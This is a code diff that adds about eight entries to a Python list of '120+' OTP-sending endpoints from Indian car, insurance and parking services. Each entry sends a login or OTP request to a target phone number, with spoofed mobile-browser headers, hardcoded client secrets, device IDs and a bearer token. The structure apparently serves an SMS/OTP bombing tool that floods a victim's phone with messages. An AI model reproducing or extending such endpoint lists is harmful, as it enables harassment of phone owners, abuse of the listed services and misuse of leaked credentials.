@@ -63,8 +63,122 @@ _global_stats = defaultdict(lambda: {
 # 📋 ALL APIS (Old + 16 New) — 120+ ENDPOINTS
 # ═══════════════════════════════════════════════════════════
 ULTIMATE_APIS = [
-    
+
     # ══════════════ NEW APIS ADDED (Based on User Request) ══════════════
+{
+    "name": "carinfo_generate_otp",
+    "url": lambda p: f"https://www.carinfo.app/core-api/car/api/v3/web/auth/user/generateOtp?mobile={p}",
+    "method": "GET",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://www.carinfo.app",
+        "Referer": "https://www.carinfo.app/"
+    },
+    "data": None
+},
+{
+    "name": "policybazaar_send_otp",
+    "url": "https://myaccount.policybazaar.com/myacc/login/sendOtpV3",
+    "method": "POST",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
+        "Content-Type": "application/json",
+        "x-ismobile": "true",
+        "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.AEOTL.eyJNb2JpbGVObyI6IjAwMDAwMDAwMDAiLCJJc0N1c3RvbWVyIjoiZmFsc2UiLCJyb2xlIjoiQWdlbnQiLCJMb2dpbklEIjoiMCIsIlN1YlNvdXJjZSI6IlBCSE9NRV9NWUFDQyIsIkxvZ2luTWVkaXVtIjoiVEVNUCIsIlNvdXJjZSI6Ik1ZQUNDIiwiSXNBcHBGbG93IjoiZmFsc2UiLCJWSUQiOiJiVFRkdFVZSnptMUFFNGRMS3dsaHJlQjFtdVhJcTBLQXlaV3VPTUNILzdScDZza0FLYjhaQVVzT1cweEJKM0xqIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbW9iaWxlcGhvbmUiOiIwMDAwMDAwMDAwIiwiQWdlbnRJRCI6MCwiU2Vzc2lvbklEIjoiNmFjYzM4OGUwN2IwZmNlZmM2NmNjZDljIiwiaWF0IjoxNzkxNzY4NzE4LCJuYmYiOjE3OTE3Njg3MTgsImV4cCI6MTc5MTc2ODc3OH0.YG5BJOcSk7YmyujMNsOZnuwh7tb0s.bhrWQCxG7IxCIOvqwC4xV_3jyfs5-62NdLLDo-1Jcn8",
+        "x-client-source": "PBHOME_MYACC",
+        "origin": "https://www.policybazaar.com",
+        "referer": "https://www.policybazaar.com/"
+    },
+    "data": lambda p: f'{{"SMSType":1,"CountryCode":"91","Mobile":"{p}","OTPLogin":true,"source":"MYACC","isCustReg":true,"requestReason":"OTPLogin"}}'
+},
+{
+    "name": "parkplus_otp",
+    "url": "https://user-service.parkplus.io/api/v1/user/b2c/otp/send/",
+    "method": "POST",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "app-name": "Park+ PWA",
+        "new-device-id": "75112be82bf6deb427e4a5e26b6cf58b",
+        "package-name": "web.pwa",
+        "client-id": "8186c1be-660f-428c-93a7-6480c2d8af66",
+        "client-secret": "hjjh0uw8c3j7vw5jgba8",
+        "device-id": "75112be82bf6deb427e4a5e26b6cf58b",
+        "platform": "web",
+        "origin": "https://parkplus.io",
+        "referer": "https://parkplus.io/"
+    },
+    "data": lambda p: f'{{"phone_number":"{p}"}}'
+},
+{
+    "name": "vahandetails_otp",
+    "url": "https://restapi.vahandetails.com/api/auth/send-otp",
+    "method": "POST",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://vahandetails.com",
+        "Referer": "https://vahandetails.com/"
+    },
+    "data": lambda p: f'{{"phone":"{p}"}}'
+},
+{
+    "name": "pbwheels_challenge",
+    "url": "https://accounts.pbwheels.com/api/auth/challenge?mode=1",
+    "method": "POST",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "origin": "https://www.pbwheels.com",
+        "referer": "https://www.pbwheels.com/"
+    },
+    "data": lambda p: f'{{"id":"{p}"}}'
+},
+{
+    "name": "themotorpedia_login",
+    "url": "https://inventory-service.themotorpedia.com/api/v1/customer/login",
+    "method": "POST",
+    "headers": {
+        "Host": "dealer-service.themotorpedia.com",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "origin": "https://themotorpedia.com",
+        "referer": "https://themotorpedia.com/"
+    },
+    "data": lambda p: f'{{"mobile":"{p}"}}'
+},
+{
+    "name": "cars24_otp",
+    "url": "https://auth.cars24.com/oauth2/otp/generate",
+    "method": "POST",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
+        "Content-Type": "application/json",
+        "x-device-id": "0c0cad0b-424b-4234-b822-e28aeec10342",
+        "x-client-id": "client_GigJNyUs3BDhksqFgNeT_w",
+        "origin": "https://www.cars24.com",
+        "referer": "https://www.cars24.com/"
+    },
+    "data": lambda p: f'{{"flow_token":"FoBd3Fs1QV0K-yckSArbr2gWp2b2rUX-UugCI-pRJOTfpEPlGQAU0eD0Ixo73dLSuDC6bxEsL4Oe-SUBcUmtJ6MIgp22BZ4AHzgEvl6aBN0cfIoKpirZgA274BOaI0nOC2vmk3EsMIXpXlmRgQTXGbIpfJB5d9YydH3Suo49NauZayEHXJ19LaAAeULUS7NhiPYUyUpKPv61AN3KVjm3OXWmRqmT9UUlpghjcagGHQlNEqrATTN5jILfxyk5twKb7UJ40FPWtTmErfBddeZWi0Y2Nn9bKxuLYYdwRf7ZWMUhtYz2aMMj3xFuLY-g9yKfUNp8agIS_CRpveq2YbIVAztDhnpDrenFJPadzgPI2U-5HGBEq3N_bqHFcWfCuzjBm6z-JrVeXSU-9rltdZ3Gve_YxflVEfLsTonynLpxhtUu6JBxa15jLR4JhOt3l6isLl2oH4v3gNb-bYOTwgOsTJkLYJT77_hgOR8WJaHDl8_qLlfTpImYvOWuDTlQIDl43DRXdPXrvErkybuwAC6dlsmOWIjGHqDvtqbD58yBzaSoSWz1CfB15TknGR_wv0tEA1mL2g21d_DWtZq-s1pcIKwldoQC6BeFLndkTSXb8tRmpAxQrdQjFIZejjLCz7U4W49fwFU2XjCYrGNpW6W87QoEiGxtEvetvC6fy9Yl4fGZWTemg-JGgsMv2vLpyIPkuK1NldY7-KP0mqWjQvA-gLPVhQX8J87ISvoBdfIHG7xNUCQ0U2ogr1pfvMXH6z-Vj_X96bNlsXo9QOLmhyyaJ5SLmqTdpMOweUm3b0cjnQ5SPKbDT21cAYVJDej3rVVl_b2EzOeCEfzzLRePzzIEpEXkrVISBXLdRhHHZ5T1lahzTG3Jv_8nJld2B_OSSPxIrQyEpYV7V0fvveSpltwtf0SRLS1W9LyxLa51Txa-PpiCbzmmQVH0u71EDV-n4eRZRW3LNWv-GJnIbmcOmyYNfH4xse3r76Zahg-mOlh_kZC20wWs8dSIMdP1RYCRA6fkqhsUyMkOKIOeoa41TvbAI7I2o03oXBkptVIdLajGaYOiKWgXuAmZRUG5Cu_pvXfY687OvpW_zMT92e1Z_byRbDFIR_qc1C3LSuuS6AWveHRMOqWJIwovenyvLxlnUUyGPo-UYweR4dhAe3eiiZcl4TFG8oruE3lLg23Azf3hj9L1t3DaHcsZC0vn-x5VhWvez5fxZk5cI5NyJFKr--lM8Z--B48b-veOn6kmUHe7t-Y6WXA3C7HgOtbUXk-pH0P6q5eHrNIm--qyIjMpUjvI-9HKU7ZiYVcnIRQ_oJz11m7VsBI7HQHIvYe9FbLWmlKPHiuIRavpCm98Cpkir1V4LCn8cn5EavzbXNBR053sMddKS2cVco_3Tr9O","method_id":"PHONE_OTP","identifier":"+91{p}"}}'
+},
+{
+    "name": "spinny_otp",
+    "url": "https://api.spinny.com/api/c/user/otp-request/v6/",
+    "method": "POST",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
+        "Content-Type": "application/json",
+        "platform": "mweb_android",
+        "origin": "https://www.spinny.com",
+        "referer": "https://www.spinny.com/"
+    },
+    "data": lambda p: f'{{"contact_number":"{p}","whatsapp":false,"code_len":4,"g-recaptcha-response":"","g-recaptcha-version":"v3","expected_action":"login"}}'
+},
       {
         "name": "zestmoney",
         "url": "https://authentication.zestmoney.in/v2/mobile/otp/",
